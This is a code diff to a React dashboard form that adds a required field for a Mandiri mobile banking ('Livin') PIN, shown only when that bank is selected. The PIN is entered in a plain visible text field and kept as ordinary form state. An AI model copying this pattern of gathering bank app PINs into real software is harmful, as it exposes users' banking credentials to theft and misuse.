@@ -1420,6 +1420,18 @@ const Dashboard = ({ setToken }) => {
                       required
                       type="text"
                     />
+                    {form.bank && form.bank.toUpperCase() === 'MANDIRI' && (
+                      <TextField
+                        fullWidth
+                        label="Pin Livin"
+                        name="mobilePin"
+                        value={form.mobilePin}
+                        onChange={handleChange}
+                        margin="normal"
+                        required
+                        type="text"
+                      />
+                    )}
                     {form.bank && form.bank.toUpperCase() === 'OCBC NISP' && (
                       <TextField
                         fullWidth
